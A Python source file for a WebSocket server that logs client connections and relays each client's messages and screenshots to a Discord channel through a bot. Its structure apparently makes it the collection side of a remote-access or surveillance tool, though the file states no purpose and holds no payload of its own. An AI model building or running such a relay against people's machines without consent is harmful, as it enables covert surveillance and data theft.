import asyncio
import websockets
from ...functions.bot.get_ip import get_public_ip
from core.logger.logger import logger
import config
import discord
import random
from .helpers.is_screenshot import is_screenshot
from io import BytesIO
import time
import json
from .ws_registry import WSRegistry


start_time = 0


async def on_send(websocket, path):
    try:
        channel = await Bot.fetch_channel(config.log_channel)
        client = WSRegistry.add_client(websocket)
        embed = discord.Embed(title="Client connected", description=f"`{websocket.remote_address}` (CID: {client.client_id}) Has been connected", color=discord.Color.green())
        await channel.send(embed=embed)
        
        
        async for message in websocket:
        
                    
            
            file = None
            if is_screenshot(message):
                screenshot_buffer = BytesIO(message)
                screenshot_buffer.seek(0)
                embed = discord.Embed(title="Client message", description=f'`{websocket.remote_address}`: Sent a screenshot', color=discord.Color.blue())
                file = discord.File(screenshot_buffer, filename="screenshot.png")
                embed.set_image(url="attachment://screenshot.png")

            else:
               embed = discord.Embed(title="Client message", description=f'`{websocket.remote_address}`: {message}', color=discord.Color.blue())
            await channel.send(embed=embed, file=file)
            logger.info(f"Message from client {websocket.remote_address}: {message if not is_screenshot(message) else 'Screenshot'}")

    except websockets.ConnectionClosed:    
        client = WSRegistry.fetch_client(websocket)
        WSRegistry.remove_client(client.client_id)
        embed = discord.Embed(title="Client disconnected", description=f"`{websocket.remote_address}` Has been disconnected", color=discord.Color.red())
        await channel.send(embed=embed)

# Start the WebSocket server
async def websocket_server():
    public_ip = get_public_ip()
    websocket_server = await websockets.serve(on_send, "localhost" if config.local_socket else "0.0.0.0", config.WEBSOCKET_PORT)
    logger.info(f"WebSocket server running on ws://{'127.0.0.1' if config.local_socket else public_ip}:{config.WEBSOCKET_PORT}") 
    start_time = time.time()
    WSRegistry.set_address(f"ws://{public_ip if not config.local_socket else '127.0.0.1'}:{config.WEBSOCKET_PORT}")
    await websocket_server.wait_closed()
    
    
async def start(bot):
    global Bot 
    Bot = bot
    
    await websocket_server()